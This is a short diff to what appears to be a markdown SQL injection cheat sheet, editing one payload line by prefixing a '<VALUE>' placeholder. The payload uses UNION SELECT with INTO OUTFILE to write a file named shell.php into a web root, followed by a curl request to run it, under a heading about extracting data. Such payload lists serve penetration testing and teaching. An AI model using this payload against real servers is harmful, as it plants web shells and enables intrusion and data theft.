@@ -16,7 +16,7 @@ Basic:
 
 > uploading file Says 'Hello from SQLI'
 ```
-'union select 1,'Hello from SQLI' INTO OUTFILE '/var/www/html/shell.php' from webapp.queue-- -
+<VALUE>'union select 1,'Hello from SQLI' INTO OUTFILE '/var/www/html/shell.php' from webapp.queue-- -
 ```
 >then exec: `curl http://example/shell.php`
 # List For Extract Data
